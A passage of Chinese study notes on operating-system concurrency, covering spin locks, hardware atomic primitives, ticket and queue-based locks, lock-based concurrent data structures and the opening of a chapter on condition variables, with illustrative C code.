PTHREAD_MUTEX_INITIALIZER;<br><br>Pthread_mutex_lock(&amp;lock); <span class="hljs-comment">// wrapper for pthread_mutex_lock()</span><br>balance = balance + <span class="hljs-number">1</span>; <br>Pthread_mutex_unlock(&amp;lock);<br></code></pre></td></tr></table></figure><p>你可能还会注意到，POSIX 的 lock 和 unlock 函数会传入一个变量，因为我们可能用不同的锁来保护不同的变量。这样可以增加并发：不同于任何临界区都使用同一个大锁（粗粒度的锁策略），通常大家会用不同的锁保护不同的数据和结构，从而允许更多的线程进入临界区（细粒度的方案）。</p><h2 id="评价锁"><a href="#评价锁" class="headerlink" title="评价锁"></a>评价锁</h2><ul><li>完成基本任务：提供<strong>互斥(mutual exclusion)</strong>,能够阻止多个线程 进入临界区；</li><li>公平性（fairness）：每一个竞争线程有公平的机会抢到锁，防止饿死（starve）即：一直无法获得锁；</li><li>性能（performance）：使用锁之后增加的时间开销。</li></ul><h2 id="控制中断"><a href="#控制中断" class="headerlink" title="控制中断"></a>控制中断</h2><p>最早提供的互斥解决方案之一，就是在临界区关闭中断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> &#123;<br>DisableInterrupts();<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> &#123;<br>EnableInterrupts();<br>&#125; <br></code></pre></td></tr></table></figure><p>缺点如下：</p><ul><li><p>这种方法要求我们允许所有调用线程执行<strong>特权操作</strong>（打开关闭中断），即信任这种机制不会被滥用。</p></li><li><p>这种方案不支持多处理器。如果多个线程运行在不同的 CPU 上，每个线程都试 图进入同一个临界区，关闭中断也没有作用。线程可以运行在其他处理器上，因此能够进 入临界区。多处理器已经很普遍了，我们的通用解决方案需要更好一些。</p></li><li><p>关闭中断导致中断丢失，可能会导致严重的系统问题。</p></li></ul><h2 id="测试并设置指令（原子交换）"><a href="#测试并设置指令（原子交换）" class="headerlink" title="测试并设置指令（原子交换）"></a>测试并设置指令（原子交换）</h2><p>最简单的硬件支持是<strong>测试并设置指令（test-and-set instruction）</strong>，也叫作<strong>原子交换（atomic exchange）</strong>。</p><h2 id="实现可用的自旋锁"><a href="#实现可用的自旋锁" class="headerlink" title="实现可用的自旋锁"></a>实现可用的自旋锁</h2><p>一些系统提供了这一指令，支持基于这种概念创建简单的锁。这个更强大的指令有不同的名字：在 SPARC 上，这个指令叫 ldstub（load/store unsigned byte，加载/保存无符号字节）；在 x86 上，是 xchg （atomic exchange，原子交换）指令。但它们基本上在不同的平台上做同样的事，通常称为<strong>测试并设置指令（test-and-set）</strong>。我们用如下的 C 代码片段来定义测试并设置指令做了什么：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">TestAndSet</span><span class="hljs-params">(<span class="hljs-type">int</span> *old_ptr, <span class="hljs-type">int</span> new)</span> &#123;<br><span class="hljs-type">int</span> old = *old_ptr; <span class="hljs-comment">// fetch old value at old_ptr</span><br>*old_ptr = new; <span class="hljs-comment">// store &#x27;new&#x27; into old_ptr</span><br><span class="hljs-keyword">return</span> old; <span class="hljs-comment">// return the old value</span><br>&#125; <br></code></pre></td></tr></table></figure><p>测试并设置指令做了下述事情。它返回 old_ptr 指向的旧值，同时更新为 new 的新值。 当然，关键是这些代码是<strong>原子地（atomically）</strong>执行。因为既可以测试旧值，又可以设置新值，所以我们把这条指令叫作“测试并设置”。这一条指令完全可以实现一个简单的<strong>自旋锁 （spin lock）</strong>。</p><p><strong>很重要的是，上面的C代码做到的事，硬件提供了其原子性实现的功能！</strong></p><p>以下是一个例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">lock_t</span> &#123;</span><br><span class="hljs-number">2</span> <span class="hljs-type">int</span> flag;<br><span class="hljs-number">3</span> &#125; <span class="hljs-type">lock_t</span>;<br><span class="hljs-number">4</span><br><span class="hljs-number">5</span> <span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(<span class="hljs-type">lock_t</span> *lock)</span> &#123;<br><span class="hljs-number">6</span> <span class="hljs-comment">// 0 indicates that lock is available, 1 that it is held</span><br><span class="hljs-number">7</span> lock-&gt;flag = <span class="hljs-number">0</span>;<br><span class="hljs-number">8</span> &#125;<br><span class="hljs-number">9</span><br><span class="hljs-number">10</span> <span class="hljs-type">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">(<span class="hljs-type">lock_t</span> *lock)</span> &#123;<br><span class="hljs-number">11</span> <span class="hljs-keyword">while</span> (TestAndSet(&amp;lock-&gt;flag, <span class="hljs-number">1</span>) == <span class="hljs-number">1</span>)<br><span class="hljs-number">12</span> ; <span class="hljs-comment">// spin-wait (do nothing)</span><br><span class="hljs-number">13</span> &#125;<br><span class="hljs-number">14</span><br><span class="hljs-number">15</span> <span class="hljs-type">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">(<span class="hljs-type">lock_t</span> *lock)</span> &#123;<br><span class="hljs-number">16</span> lock-&gt;flag = <span class="hljs-number">0</span>;<br><span class="hljs-number">17</span> &#125; <br></code></pre></td></tr></table></figure><p>我们来确保理解为什么这个锁能工作。首先假设一个线程在运行，调用 lock()，没有其他线程持有锁，所以 flag 是 0。当调用 TestAndSet(flag, 1)方法，返回 0，线程会跳出 while 循环，获取锁。同时也会原子的设置 flag 为 1，标志锁已经被持有。当线程离开临界区，调用 unlock()将 flag 清理为 0。</p><h2 id="评价自旋锁"><a href="#评价自旋锁" class="headerlink" title="评价自旋锁"></a>评价自旋锁</h2><ul><li>正确性：√</li><li>公平性：–（无法保证）</li><li>性能：单CPU：不行；多CPU：还行。</li></ul><h2 id="比较并交换"><a href="#比较并交换" class="headerlink" title="比较并交换"></a>比较并交换</h2><p><strong>比较并交换指令</strong>（SPARC 系统中是 compare-and-swap， x86 系统是 compare-and-exchange）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">CompareAndSwap</span><span class="hljs-params">(<span class="hljs-type">int</span> *ptr, <span class="hljs-type">int</span> expected, <span class="hljs-type">int</span> new)</span> &#123;<br><span class="hljs-type">int</span> actual = *ptr;<br><span class="hljs-keyword">if</span> (actual == expected)<br>*ptr = new;<br><span class="hljs-keyword">return</span> actual;<br>&#125; <br></code></pre></td></tr></table></figure><p>比较并交换的基本思路是检测 ptr 指向的值是否和 expected 相等；如果是，更新 ptr 所 指的值为新值。否则，什么也不做。不论哪种情况，都返回该内存地址的实际值，让调用者能够知道执行是否成功。</p><p>最后，你可能会发现，比较并交换指令比测试并设置更强大。当我们在将来简单探讨<strong>无等待同步（wait-free synchronization）</strong>时，会用到这条指令的强大之处。然而，如果 只用它实现一个简单的自旋锁，它的行为等价于上面分析的自旋锁。</p><h2 id="链接的加载和条件式存储指令"><a href="#链接的加载和条件式存储指令" class="headerlink" title="链接的加载和条件式存储指令"></a>链接的加载和条件式存储指令</h2><p><strong>链接的加载 （load-linked）</strong>和<strong>条件式存储（store-conditional）</strong>可以用来配合使用，实现其他并发结构。</p><p>以下是这些指令的 C 语言伪代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">int</span> <span class="hljs-title function_">LoadLinked</span><span class="hljs-params">(<span class="hljs-type">int</span> *ptr)</span> &#123;<br><span class="hljs-number">2</span> <span class="hljs-keyword">return</span> *ptr;<br><span class="hljs-number">3</span> &#125;<br><span class="hljs-number">4</span><br><span class="hljs-number">5</span> <span class="hljs-type">int</span> <span class="hljs-title function_">StoreConditional</span><span class="hljs-params">(<span class="hljs-type">int</span> *ptr, <span class="hljs-type">int</span> value)</span> &#123;<br><span class="hljs-number">6</span> <span class="hljs-keyword">if</span> (no one has updated *ptr since the LoadLinked to this address) &#123; <br><span class="hljs-number">7</span> *ptr = value;<br><span class="hljs-number">8</span> <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// success!</span><br><span class="hljs-number">9</span> &#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-number">10</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// failed to update</span><br><span class="hljs-number">11</span> &#125;<br><span class="hljs-number">12</span> &#125;<br></code></pre></td></tr></table></figure><p>链接的加载指令和典型加载指令类似，都是从内存中取出值存入一个寄存器。关键区别来自<strong>条件式存储（store-conditional）指令</strong>，只有上一次加载的地址在期间都<strong>没有更新</strong>时， 才会成功，（同时更新刚才链接的加载的地址的值）。成功时，条件存储返回 1，并将 ptr 指 的值更新为 value。失败时，返回 0，并且不会更新值。</p><p>请注意条件式存储失败是如何发生的。一个线程调用 lock()，执行了链接的加载指令， 返回 0。在执行条件式存储之前，中断产生了，另一个线程进入 lock 的代码，也执行链接式加载指令，同样返回 0。现在，两个线程都执行了链接式加载指令，将要执行条件存储。重点是<strong>只有一个线程能够成功更新标志为 1</strong>，从而获得锁；第二个执行条件存储的线程会失败（因为另一个线程已经<strong>成功执行了条件更新</strong>），必须重新尝试获取锁。</p><h2 id="获取并增加"><a href="#获取并增加" class="headerlink" title="获取并增加"></a>获取并增加</h2><p>最后一个硬件原语是<strong>获取并增加（fetch-and-add）</strong>指令，它能原子地返回特定地址的旧 值，并且让该值自增一。获取并增加的 C 语言伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">int</span> <span class="hljs-title function_">FetchAndAdd</span><span class="hljs-params">(<span class="hljs-type">int</span> *ptr)</span> &#123;<br><span class="hljs-number">2</span> <span class="hljs-type">int</span> old = *ptr;<br><span class="hljs-number">3</span> *ptr = old + <span class="hljs-number">1</span>;<br><span class="hljs-number">4</span> <span class="hljs-keyword">return</span> old;<br><span class="hljs-number">5</span> &#125;<br><span class="hljs-number">1</span> <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">lock_t</span> &#123;</span><br><span class="hljs-number">2</span> <span class="hljs-type">int</span> ticket;<br><span class="hljs-number">3</span> <span class="hljs-type">int</span> turn;<br><span class="hljs-number">4</span> &#125; <span class="hljs-type">lock_t</span>;<br><span class="hljs-number">5</span><br><span class="hljs-number">6</span> <span class="hljs-type">void</span> <span class="hljs-title function_">lock_init</span><span class="hljs-params">(<span class="hljs-type">lock_t</span> *lock)</span> &#123;<br><span class="hljs-number">7</span> lock-&gt;ticket = <span class="hljs-number">0</span>;<br><span class="hljs-number">8</span> lock-&gt;turn = <span class="hljs-number">0</span>;<br><span class="hljs-number">9</span> &#125;<br><span class="hljs-number">10</span><br><span class="hljs-number">11</span> <span class="hljs-type">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">(<span class="hljs-type">lock_t</span> *lock)</span> &#123;<br><span class="hljs-number">12</span> <span class="hljs-type">int</span> myturn = FetchAndAdd(&amp;lock-&gt;ticket);<br><span class="hljs-number">13</span> <span class="hljs-keyword">while</span> (lock-&gt;turn != myturn)<br><span class="hljs-number">14</span> ; <span class="hljs-comment">// spin</span><br><span class="hljs-number">15</span> &#125;<br><span class="hljs-number">16</span><br><span class="hljs-number">17</span> <span class="hljs-type">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">(<span class="hljs-type">lock_t</span> *lock)</span> &#123;<br><span class="hljs-number">18</span> FetchAndAdd(&amp;lock-&gt;turn);<br><span class="hljs-number">19</span> &#125; <br></code></pre></td></tr></table></figure><p>不是用一个值，这个解决方案使用了 ticket 和 turn 变量来构建锁。基本操作也很简单： 如果线程希望获取锁，首先对一个 ticket 值执行一个原子的获取并相加指令。这个值作为该线程的<strong>“turn”（顺位，即 myturn）</strong>。根据全局共享的 lock-&gt;turn 变量，当某一个线程的（myturn == turn）时，则轮到这个线程进入临界区。<strong>unlock 则是增加 turn</strong>，从而下一个等待线程可以 进入临界区。</p><p>不同于之前的方法：<strong>本方法能够保证所有线程都能抢到锁</strong>。只要一个线程获得了 ticket 值，它最终会被调度。</p><h2 id="自选过多带来的性能低下"><a href="#自选过多带来的性能低下" class="headerlink" title="自选过多带来的性能低下"></a>自选过多带来的性能低下</h2><p>即除了当前持有锁的那个线程外，其余线程的时间片，均在自旋；</p><p>考虑如果有 N 个线程去竞争一个锁，情况很糟糕。同样的场景下，会浪费 N−1 个时间片，只是自旋并等待一个线程释放该锁。</p><h2 id="简单方法"><a href="#简单方法" class="headerlink" title="简单方法"></a>简单方法</h2><p>第一种简单友好的方法就是，在要自旋的时候，放弃 CPU。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-number">2</span> flag = <span class="hljs-number">0</span>;<br><span class="hljs-number">3</span> &#125;<br><span class="hljs-number">4</span><br><span class="hljs-number">5</span> <span class="hljs-type">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-number">6</span> <span class="hljs-keyword">while</span> (TestAndSet(&amp;flag, <span class="hljs-number">1</span>) == <span class="hljs-number">1</span>)<br><span class="hljs-number">7</span> yield(); <span class="hljs-comment">// give up the CPU</span><br><span class="hljs-number">8</span> &#125;<br><span class="hljs-number">9</span><br><span class="hljs-number">10</span> <span class="hljs-type">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-number">11</span> flag = <span class="hljs-number">0</span>;<br><span class="hljs-number">12</span> &#125; <br></code></pre></td></tr></table></figure><p>考虑在单 CPU 上运行两个线程。在这个例子中，基于 yield 的方法十分有效。一个线程调用 lock()，发现锁被占用时，让出 CPU，另外一个线程运行，完成临界区。在这个简单的例子中，让出方法工作得非常好。 </p><p>现在来考虑许多线程（例如 100 个）反复竞争一把锁的情况。在这种情况下，一个线程持有锁，在释放锁之前被抢占，其他 99 个线程分别调用 lock()，发现锁被抢占，然后让出 CPU。假定采用某种轮转调度程序，这 99 个线程会一直处于运行—让出这种模式，直到持有锁的线程再次运行。虽然比原来的浪费 99 个时间片的自旋方案要好，但这种方法仍然成本很高，上下文切换的成本是实实在在的，因此浪费很大。</p><h2 id="使用队列：休眠代替自选"><a href="#使用队列：休眠代替自选" class="headerlink" title="使用队列：休眠代替自选"></a>使用队列：休眠代替自选</h2><p>前面一些方法的真正问题是存在太多的偶然性。调度程序决定如何调度。如果调度不 合理，线程或者一直自旋（第一种方法），或者立刻让出 CPU（第二种方法）。无论哪种方 法，都可能造成浪费，也能防止饿死。</p><p>因此，我们必须显式地施加某种控制，决定锁释放时，谁能抢到锁。为了做到这一点， 我们需要操作系统的更多支持，并需要一个队列来保存等待锁的线程。</p><p>简单起见，我们利用 Solaris 提供的支持，它提供了两个调用：park()能够让调用线程休 眠，unpark(threadID)则会唤醒 threadID 标识的线程。可以用这两个调用来实现锁，让调用 者在获取不到锁时睡眠，在锁可用时被唤醒。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">lock_t</span> &#123;</span><br><span class="hljs-number">2</span>   <span class="hljs-type">int</span> flag;<br><span class="hljs-number">3</span>   <span class="hljs-type">int</span> guard;<br><span class="hljs-number">4</span>   <span class="hljs-type">queue_t</span> *q;<br><span class="hljs-number">5</span> &#125; <span class="hljs-type">lock_t</span>;<br><span class="hljs-number">6</span><br><span class="hljs-number">7</span> <span class="hljs-type">void</span> <span class="hljs-title function_">lock_init</span><span class="hljs-params">(<span class="hljs-type">lock_t</span> *m)</span> &#123;<br><span class="hljs-number">8</span>   m-&gt;flag = <span class="hljs-number">0</span>;<br><span class="hljs-number">9</span>   m-&gt;guard = <span class="hljs-number">0</span>;<br><span class="hljs-number">10</span>   queue_init(m-&gt;q);<br><span class="hljs-number">11</span> &#125;<br><span class="hljs-number">12</span><br><span class="hljs-number">13</span> <span class="hljs-type">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">(<span class="hljs-type">lock_t</span> *m)</span> &#123;<br><span class="hljs-number">14</span> <span class="hljs-keyword">while</span> (TestAndSet(&amp;m-&gt;guard, <span class="hljs-number">1</span>) == <span class="hljs-number">1</span>)<br><span class="hljs-number">15</span> ; <span class="hljs-comment">//acquire guard lock by spinning</span><br><span class="hljs-number">16</span>   <span class="hljs-keyword">if</span> (m-&gt;flag == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-number">17</span>   m-&gt;flag = <span class="hljs-number">1</span>; <span class="hljs-comment">// lock is acquired</span><br><span class="hljs-number">18</span>   m-&gt;guard = <span class="hljs-number">0</span>;<br><span class="hljs-number">19</span> &#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-number">20</span>   queue_add(m-&gt;q, gettid());<br><span class="hljs-number">21</span>  m-&gt;guard = <span class="hljs-number">0</span>;<br><span class="hljs-number">22</span>   park();<br><span class="hljs-number">23</span>  &#125;<br><span class="hljs-number">24</span> &#125;<br><span class="hljs-number">25</span><br><span class="hljs-number">26</span> <span class="hljs-type">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">(<span class="hljs-type">lock_t</span> *m)</span> &#123;<br><span class="hljs-number">27</span> <span class="hljs-keyword">while</span> (TestAndSet(&amp;m-&gt;guard, <span class="hljs-number">1</span>) == <span class="hljs-number">1</span>)<br><span class="hljs-number">28</span> ; <span class="hljs-comment">//acquire guard lock by spinning</span><br><span class="hljs-number">29</span>   <span class="hljs-keyword">if</span> (queue_empty(m-&gt;q))<br><span class="hljs-number">30</span>   m-&gt;flag = <span class="hljs-number">0</span>; <span class="hljs-comment">// let go of lock; no one wants it</span><br><span class="hljs-number">31</span> <span class="hljs-keyword">else</span><br><span class="hljs-number">32</span>   unpark(queue_remove(m-&gt;q)); <span class="hljs-comment">// hold lock (for next thread!)</span><br><span class="hljs-number">33</span>   m-&gt;guard = <span class="hljs-number">0</span>;<br><span class="hljs-number">34</span> &#125; <br></code></pre></td></tr></table></figure><p>在这个例子中，我们做了两件有趣的事。首先，我们将之前的测试并设置和等待队列 结合，实现了一个更高性能的锁。其次，我们通过队列来控制谁会获得锁，避免饿死。</p><p>你可能注意到，guard 基本上起到了自旋锁的作用，围绕着 flag 和队列操作。因此，这 个方法并没有完全避免自旋等待。线程在获取锁或者释放锁时可能被中断，从而导致其他 线程自旋等待。但是，这个自旋等待时间是很有限的（不是用户定义的临界区，只是在 lock 和 unlock 代码中的几个指令），因此，这种方法也许是合理的。</p><p>第二点，你可能注意到在 lock()函数中，如果线程不能获取锁（它已被持有），线程会 把自己加入队列（通过调用 gettid()获得当前的线程 ID），将 guard 设置为 0，然后让出 CPU。</p><p>你还可能注意到了很有趣一点，当要唤醒另一个线程时，flag 并没有设置为 0。为什么 呢？其实这不是错，而是必须的！线程被唤醒时，就像是从 park()调用返回。但是，此时它 没有持有 guard，所以也不能将 flag 设置为 1。因此，我们就直接把锁从释放的线程传递给 下一个获得锁的线程，期间 flag 不必设置为 0。</p><p>最后，你可能注意到解决方案中的竞争条件，就在 park()调用之前。如果不凑巧，一个 线程将要 park，假定它应该睡到锁可用时。这时切换到另一个线程（比如持有锁的线程）， 这可能会导致麻烦。比如，如果该线程随后释放了锁。接下来第一个线程的 park 会永远睡 下去（可能）。这种问题有时称为唤醒/等待竞争（wakeup/waiting race）。为了避免这种情况， 我们需要额外的工作。</p><p>Solaris 通过增加了第三个系统调用 separk()来解决这一问题。通过 setpark()，一个线程 表明自己马上要 park。如果刚好另一个线程被调度，并且调用了 unpark，那么后续的 park 调用就会直接返回，而不是一直睡眠。lock()调用可以做一点小修改：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> queue_add(m-&gt;q, gettid());<br><span class="hljs-number">2</span> setpark(); <span class="hljs-comment">// new code</span><br><span class="hljs-number">3</span> m-&gt;guard = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><h1 id="第-29-章-基于锁的并发数据结构"><a href="#第-29-章-基于锁的并发数据结构" class="headerlink" title="第 29 章 基于锁的并发数据结构"></a>第 29 章 基于锁的并发数据结构</h1><h2 id="并发计数器"><a href="#并发计数器" class="headerlink" title="并发计数器"></a>并发计数器</h2><p><strong>懒惰计数器</strong></p><ul><li>有一个全局计数器；</li><li>有多个局部计数器；</li><li>有一个S阈值，每当局部计数器达到 S ，向全局计数器加，然后该局部计时器置零。</li><li>每个局部计数器有一个锁，全局计数器有一个。</li></ul><p><img src="/2023/03/23/Operating-Systems/p21.png"></p><h2 id="并发链表"><a href="#并发链表" class="headerlink" title="并发链表"></a>并发链表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">void</span> <span class="hljs-title function_">List_Init</span><span class="hljs-params">(<span class="hljs-type">list_t</span> *L)</span> &#123;<br><span class="hljs-number">2</span> L-&gt;head = <span class="hljs-literal">NULL</span>;<br><span class="hljs-number">3</span> pthread_mutex_init(&amp;L-&gt;lock, <span class="hljs-literal">NULL</span>);<br><span class="hljs-number">4</span> &#125;<br><span class="hljs-number">5</span><br><span class="hljs-number">6</span> <span class="hljs-type">void</span> <span class="hljs-title function_">List_Insert</span><span class="hljs-params">(<span class="hljs-type">list_t</span> *L, <span class="hljs-type">int</span> key)</span> &#123;<br><span class="hljs-number">7</span> <span class="hljs-comment">// synchronization not needed</span><br><span class="hljs-number">8</span> <span class="hljs-type">node_t</span> *new = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">node_t</span>));<br><span class="hljs-number">9</span> <span class="hljs-keyword">if</span> (new == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-number">10</span> perror(<span class="hljs-string">&quot;malloc&quot;</span>);<br><span class="hljs-number">11</span> <span class="hljs-keyword">return</span>;<br><span class="hljs-number">12</span> &#125;<br><span class="hljs-number">13</span> new-&gt;key = key;<br><span class="hljs-number">14</span><br><span class="hljs-number">15</span> <span class="hljs-comment">// just lock critical section</span><br><span class="hljs-number">16</span> pthread_mutex_lock(&amp;L-&gt;lock);<br><span class="hljs-number">17</span> new-&gt;next = L-&gt;head;<br><span class="hljs-number">18</span> L-&gt;head = new;<br><span class="hljs-number">19</span> pthread_mutex_unlock(&amp;L-&gt;lock);<br><span class="hljs-number">20</span> &#125;<br><span class="hljs-number">21</span><br><span class="hljs-number">22</span> <span class="hljs-type">int</span> <span class="hljs-title function_">List_Lookup</span><span class="hljs-params">(<span class="hljs-type">list_t</span> *L, <span class="hljs-type">int</span> key)</span> &#123;<br><span class="hljs-number">23</span> <span class="hljs-type">int</span> rv = <span class="hljs-number">-1</span>;<br><span class="hljs-number">24</span> pthread_mutex_lock(&amp;L-&gt;lock);<br><span class="hljs-number">25</span> <span class="hljs-type">node_t</span> *curr = L-&gt;head;<br><span class="hljs-number">26</span> <span class="hljs-keyword">while</span> (curr) &#123;<br><span class="hljs-number">27</span> <span class="hljs-keyword">if</span> (curr-&gt;key == key) &#123;<br><span class="hljs-number">28</span> rv = <span class="hljs-number">0</span>;<br><span class="hljs-number">29</span> <span class="hljs-keyword">break</span>;<br><span class="hljs-number">30</span> &#125;<br><span class="hljs-number">31</span> curr = curr-&gt;next;<br><span class="hljs-number">32</span> &#125;<br><span class="hljs-number">33</span> pthread_mutex_unlock(&amp;L-&gt;lock);<br><span class="hljs-number">34</span> <span class="hljs-keyword">return</span> rv; <span class="hljs-comment">// now both success and failure</span><br><span class="hljs-number">35</span> &#125; <br></code></pre></td></tr></table></figure><p><strong>过手锁（hand-over-hand locking，也叫作锁耦合， lock coupling）</strong></p><p>每个节点都有一个锁，替代之前整个链表一个锁。遍历链表的时候，首先抢占下一个节点的锁，然后释放当前节点的锁。</p><p>从概念上说，过手锁链表有点道理，它增加了链表操作的并发程度。但是实际上，在遍历的时候，每个节点获取锁、释放锁的开销巨大，很难比单锁的方法快。即使有大量的线程和很大的链表，这种并发的方案也不一定会比单锁的方案快。</p><h2 id="并发队列"><a href="#并发队列" class="headerlink" title="并发队列"></a>并发队列</h2><h2 id="并发散列表"><a href="#并发散列表" class="headerlink" title="并发散列表"></a>并发散列表</h2><h1 id="第-30-章-条件变量"><a href="#第-30-章-条件变量" class="headerlink" title="第 30 章 条件变量"></a>第 30 章 条件变量</h1><p>到目前为止，我们已经形成了锁的概念，看到了如何通过硬件和操作系统支持的正确组合来实现锁。然而，锁并不是并发程序设计所需的唯一原语。</p><p>具体来说，在很多情况下，线程需要检查某一条件（condition）满足之后，才会继续运行。</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>线程可以使用<strong>条件变量（condition variable）</strong>，来等待一个条件变成真。条件变量是一个显式队列，当某些<strong>执行状态（即条件，condition）</strong>不满足时，线程可以把自己加入队列，<strong>等待（waiting）</strong>该条件。另外某个线程，当它<strong>改变</strong>了上述状态时，就可以<strong>唤醒</strong>一个或者多个等待线程（通过在该条件上发信号），让它们继续执行。</p><p>要声明这样的条件变量，只要像这样写：**pthread_cond_t c;<strong>，这里声明 c 是一个条件变量（注意：还需要适当的初始化）。条件变量有两种相关操作：</strong>wait()和 signal()**。线程要睡眠的时候，调用 wait()。当线程想唤醒等待在某个条件变量上的睡眠线程时，调用 **signal()**。</p><p>如父进程等待子进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 